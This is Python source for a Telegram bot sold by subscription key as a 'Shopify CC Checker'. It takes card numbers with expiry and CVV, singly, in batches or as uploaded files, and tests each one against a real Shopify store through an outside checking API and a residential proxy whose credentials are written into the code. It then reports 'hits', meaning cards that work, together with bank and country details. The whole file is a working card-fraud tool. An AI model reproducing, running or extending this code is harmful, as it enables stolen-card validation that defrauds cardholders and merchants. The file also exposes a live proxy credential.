import os
import logging
import uuid
import time
import json
import httpx
from telegram import Update
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters
from urllib.parse import quote

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
OWNER_USERNAME = "@ESCROW2929"
AUTHORIZED_ADMINS = {8785590284}
DATA_FILE = "users_data.json"

def load_data():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, "r") as f:
                data = json.load(f)
                return (
                    set(data.get("all_users", [])),
                    set(data.get("banned_users", [])),
                    set(data.get("sub_admins", [])),
                    data.get("active_keys", {}),
                    {int(k): v for k, v in data.get("user_subscriptions", {}).items()}
                )
        except Exception as e:
            logger.error(f"Error loading data: {e}")
    return set(), set(), set(), {}, {}

def save_data():
    data = {
        "all_users": list(ALL_USERS),
        "banned_users": list(BANNED_USERS),
        "sub_admins": list(SUB_ADMINS),
        "active_keys": ACTIVE_KEYS,
        "user_subscriptions": USER_SUBSCRIPTIONS
    }
    try:
        with open(DATA_FILE, "w") as f:
            json.dump(data, f)
    except Exception as e:
        logger.error(f"Error saving data: {e}")

ALL_USERS, BANNED_USERS, SUB_ADMINS, ACTIVE_KEYS, USER_SUBSCRIPTIONS = load_data()

def is_main_admin(user_id):
    return user_id in AUTHORIZED_ADMINS

def is_any_admin(user_id):
    return user_id in AUTHORIZED_ADMINS or user_id in SUB_ADMINS

def parse_time_to_seconds(time_str):
    time_str = time_str.lower().strip()
    try:
        if 'd' in time_str:
            days = int(time_str.replace('d', ''))
            return days * 86400
        elif 'hour' in time_str or 'h' in time_str:
            hours = int(time_str.replace('hour', '').replace('h', '').strip())
            return hours * 3600
        elif 'm' in time_str:
            mins = int(time_str.replace('m', '').strip())
            return mins * 60
    except ValueError:
        pass
    return 86400

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in BANNED_USERS:
        await update.message.reply_text("❌ You are banned from using this bot.")
        return
    ALL_USERS.add(user_id)
    save_data()
    user = update.effective_user
    await update.message.reply_text(
        f"Hello {user.first_name}!\n\n"
        f"🤖 Shopify CC Checker Bot is Online\n"
        f"⚠️ Note: Use /redeem <key> to activate your access before checking cards.\n\n"
        f"👑 Owner: {OWNER_USERNAME}"
    )

async def admin_pannel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_any_admin(user_id):
        await update.message.reply_text("❌ You are not authorized to use the Admin Panel.")
        return
    panel_message = (
        f"🛠 Admin Panel & Controls\n\n"
        f"• Gateway: Shopify API Connected ✅\n"
        f"• Total Active Users Tracked: {len(ALL_USERS)}\n"
        f"• Total Keys in System: {len(ACTIVE_KEYS)}\n"
        f"• Sub-Admins: {len(SUB_ADMINS)}\n"
        f"• Banned Users: {len(BANNED_USERS)}\n\n"
        f"Available Commands:\n"
        f"/key <quantity> <time> (e.g., /key 25 1d)\n"
        f"/announcement <message>\n"
    )
    if is_main_admin(user_id):
        panel_message += "/makeadmin <id>\n/removeadmin <id>\n/ban <id>\n/unban <id>"
    await update.message.reply_text(panel_message)

async def announcement_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_any_admin(user_id):
        await update.message.reply_text("❌ You are not authorized.")
        return
    if not context.args:
        await update.message.reply_text("❌ Usage: /announcement Your message here")
        return
    broadcast_msg = "📢 Announcement:\n\n" + " ".join(context.args)
    sent_count, fail_count = 0, 0
    status_msg = await update.message.reply_text("⏳ Broadcasting announcement...")
    for uid in list(ALL_USERS):
        try:
            await context.bot.send_message(chat_id=uid, text=broadcast_msg)
            sent_count += 1
        except Exception:
            fail_count += 1
    await context.bot.edit_message_text(
        chat_id=update.effective_chat.id,
        message_id=status_msg.message_id,
        text=f"✅ Broadcast Completed!\n\n• Sent: {sent_count}\n• Failed: {fail_count}"
    )

async def generate_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_any_admin(user_id):
        await update.message.reply_text("❌ Unauthorized.")
        return
    if len(context.args) < 2:
        await update.message.reply_text("❌ Usage: /key <quantity> <time>\nExample: /key 25 1d")
        return
    try:
        qty = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ Quantity must be a number.")
        return
    time_str = context.args[1]
    duration_secs = parse_time_to_seconds(time_str)
    generated_keys_list = []
    for _ in range(qty):
        unique_suffix = uuid.uuid4().hex[:8].upper()
        key_str = f"PRIME-{unique_suffix}"
        ACTIVE_KEYS[key_str] = {"duration_seconds": duration_secs, "used_by": None, "expiry_time": None}
        generated_keys_list.append(key_str)
    save_data()
    keys_text = "\n".join([f"`{k}`" for k in generated_keys_list])
    response_msg = f"🔑 {qty} Keys Generated Successfully!\n⏱ Duration: {time_str}\n\n{keys_text}"
    if len(response_msg) > 4000:
        await update.message.reply_text(f"🔑 {qty} Keys generated successfully! (List is too long).", parse_mode="Markdown")
    else:
        await update.message.reply_text(response_msg, parse_mode="Markdown")

async def redeem_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in BANNED_USERS:
        await update.message.reply_text("❌ You are banned.")
        return
    ALL_USERS.add(user_id)
    save_data()
    if not context.args:
        await update.message.reply_text("❌ Usage: /redeem PRIME-XXXXXXXX")
        return
    user_key = context.args[0].strip().upper()
    if user_key not in ACTIVE_KEYS:
        await update.message.reply_text("❌ Invalid Key!")
        return
    key_data = ACTIVE_KEYS[user_key]
    if key_data["used_by"] is not None:
        await update.message.reply_text("❌ Key already used!")
        return
    current_time = time.time()
    expiry_timestamp = current_time + key_data["duration_seconds"]
    key_data["used_by"] = user_id
    key_data["expiry_time"] = expiry_timestamp
    USER_SUBSCRIPTIONS[user_id] = expiry_timestamp
    save_data()
    await update.message.reply_text("✅ Key Successfully Redeemed!\n🎉 Premium access active.")

async def make_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_main_admin(update.effective_user.id):
        return
    if context.args:
        try:
            new_admin = int(context.args[0])
            SUB_ADMINS.add(new_admin)
            save_data()
            await update.message.reply_text(f"✅ Added {new_admin}")
        except ValueError:
            pass

async def remove_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_main_admin(update.effective_user.id):
        return
    if context.args:
        try:
            target = int(context.args[0])
            if target in SUB_ADMINS:
                SUB_ADMINS.remove(target)
                save_data()
                await update.message.reply_text(f"✅ Removed {target}")
        except ValueError:
            pass

async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_main_admin(update.effective_user.id):
        return
    if context.args:
        try:
            target = int(context.args[0])
            BANNED_USERS.add(target)
            save_data()
            await update.message.reply_text(f"🚫 Banned {target}")
        except ValueError:
            pass

async def unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_main_admin(update.effective_user.id):
        return
    if context.args:
        try:
            target = int(context.args[0])
            if target in BANNED_USERS:
                BANNED_USERS.remove(target)
                save_data()
                await update.message.reply_text(f"✅ Unbanned {target}")
        except ValueError:
            pass

def has_access(user_id):
    if is_any_admin(user_id):
        return True
    if user_id in USER_SUBSCRIPTIONS:
        if time.time() < USER_SUBSCRIPTIONS[user_id]:
            return True
        else:
            del USER_SUBSCRIPTIONS[user_id]
            save_data()
            return False
    return False

async def get_bin_info(bin_code):
    try:
        async with httpx.AsyncClient(timeout=10.0) as client:
            res = await client.get(f"https://lookup.binlist.net/{bin_code}")
            if res.status_code == 200:
                data = res.json()
                scheme = data.get("scheme", "UNKNOWN").upper()
                type_val = data.get("type", "UNKNOWN").upper()
                brand = data.get("brand", "").upper()
                bank_name = data.get("bank", {}).get("name", "UNKNOWN").upper()
                country_name = data.get("country", {}).get("name", "UNKNOWN").upper()
                country_emoji = data.get("country", {}).get("emoji", "")
                bin_desc = f"{scheme} - {type_val}"
                if brand:
                    bin_desc += f" - {brand}"
                return bin_desc, bank_name, f"{country_name} {country_emoji}"
    except Exception:
        pass
    return "UNKNOWN - UNKNOWN", "UNKNOWN", "UNKNOWN"

async def process_card_string(card_line, user_full_name):
    try:
        parts = card_line.split('|')
        if len(parts) < 4:
            return f"❌ {card_line} ➔ Invalid Format"
        
        cc, mes, ano, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
        formatted_cc = f"{cc}|{mes}|{ano}|{cvv}"
        full_card_display = f"{cc}|{mes}|{ano}|{cvv}"
        bin_code = cc[:6]
        
        bin_info, bank_info, country_info = await get_bin_info(bin_code)
        
        site_url = "https://ripnroll.com"
        proxy_val = "brd-customer-hl_54dda161-zone-isp_proxy1-country-in-state-jammu-and-kashmir:sxf92a7e5g32@brd.superproxy.io:33335"
        api_url = f"https://web-production-c2d03.up.railway.app/shopify?site={quote(site_url)}&cc={quote(formatted_cc)}&proxy={quote(proxy_val)}"
        
        # Fixed httpx client without incorrect proxies keyword argument
        async with httpx.AsyncClient(timeout=30.0, follow_redirects=True) as client:
            response = await client.get(api_url)
            if response.status_code != 200:
                return f"❌ {card_line} ➔ API Server Error (Status Code: {response.status_code})"
            res_data = response.json()
        
        resp_status = res_data.get("Response", "UNKNOWN")
        price = res_data.get("Price", "$14.97")
        gate = res_data.get("Gate", "Shopify Payments")
        approved = res_data.get("Approved", "False")
        charged = res_data.get("Charged", "False")
        
        is_success = (approved.lower() == "true" or charged.lower() == "true" or "approved" in resp_status.lower() or "success" in resp_status.lower())
        hit_title = "⚡💠 𝐇𝐢𝐭 𝐅𝐨𝐮𝐧𝐝!" if is_success else "❌💠 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝!"
        
        return (
            f"⚡💳  # PRIME CHECKER  💳⚡\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"{hit_title}\n"
            f"⚠️ Status: {resp_status}\n"
            f"💳 Card: {full_card_display}\n"
            f"📝 Response: {resp_status}\n"
            f"🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gate} | 💰 {price}\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"🎯💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨\n"
            f"𝗕𝗜𝗡 𝗜𝗻𝐟𝗼: {bin_info}\n"
            f"𝗕𝗮𝗻𝗸: {bank_info}\n"
            f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country_info}\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"👤 Cʜᴇᴄᴋᴇᴅ Bʏ ➠ {user_full_name}\n"
            f"🤖 Bot By:  PRIME, SIMPLE BOY, SHINCHAN"
        )
            
    except httpx.TimeoutException:
        return f"❌ {card_line} ➔ API Timeout"
    except Exception as e:
        logger.error(f"Processing error: {str(e)}")
        return f"❌ {card_line} ➔ API Error / Connection Failed"

async def chk_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in BANNED_USERS:
        return
    ALL_USERS.add(user_id)
    save_data()
    if not has_access(user_id):
        await update.message.reply_text("❌ Subscription expired or no key redeemed. Use /redeem <key>.")
        return
    if not context.args:
        await update.message.reply_text("❌ Usage: /chk CC|MM|YY|CVV")
        return
    card_line = "".join(context.args)
    user_full_name = update.effective_user.first_name
    msg = await update.message.reply_text("⌛ Checking card...")
    res = await process_card_string(card_line, user_full_name)
    await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=msg.message_id, text=res)

async def chks_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in BANNED_USERS:
        return
    ALL_USERS.add(user_id)
    save_data()
    if not has_access(user_id):
        await update.message.reply_text("❌ Subscription expired.")
        return
    text = update.message.text
    lines = text.split('\n')[1:] if '\n' in text else []
    if not lines:
        await update.message.reply_text("❌ Send cards line-by-line below /chks")
        return
    user_full_name = update.effective_user.first_name
    msg = await update.message.reply_text("⌛ Processing cards...")
    results = [await process_card_string(line.strip(), user_full_name) for line in lines[:10] if "|" in line]
    if results:
        await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=msg.message_id, text="\n\n".join(results))
    else:
        await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=msg.message_id, text="❌ No valid cards found.")

async def chf_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in BANNED_USERS:
        return
    ALL_USERS.add(user_id)
    save_data()
    if not has_access(user_id):
        await update.message.reply_text("❌ Subscription expired.")
        return
    document = update.message.document
    if not document:
        await update.message.reply_text("❌ Please upload a text file.")
        return
    user_full_name = update.effective_user.first_name
    msg = await update.message.reply_text("⌛ Processing document file...")
    file = await context.bot.get_file(document.file_id)
    file_bytes = await file.download_as_bytearray()
    file_text = file_bytes.decode("utf-8", errors="ignore")
    lines = file_text.split('\n')
    results = [await process_card_string(line.strip(), user_full_name) for line in lines[:10] if "|" in line]
    if results:
        await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=msg.message_id, text=f"📁 File Processed!\n\n" + "\n\n".join(results))
    else:
        await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=msg.message_id, text="❌ File contains no valid card lines.")

def main():
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("adminpannel", admin_pannel))
    app.add_handler(CommandHandler("announcement", announcement_command))
    app.add_handler(CommandHandler("key", generate_key))
    app.add_handler(CommandHandler("redeem", redeem_key))
    app.add_handler(CommandHandler("makeadmin", make_admin))
    app.add_handler(CommandHandler("removeadmin", remove_admin))
    app.add_handler(CommandHandler("ban", ban_user))
    app.add_handler(CommandHandler("unban", unban_user))
    app.add_handler(CommandHandler("chk", chk_card))
    app.add_handler(CommandHandler("chks", chks_cards))
    app.add_handler(CommandHandler("chf", chf_document))
    app.add_handler(MessageHandler(filters.Document.ALL, chf_document))
    print("Bot is up and running...")
    app.run_polling()

if __name__ == "__main__":
    main()
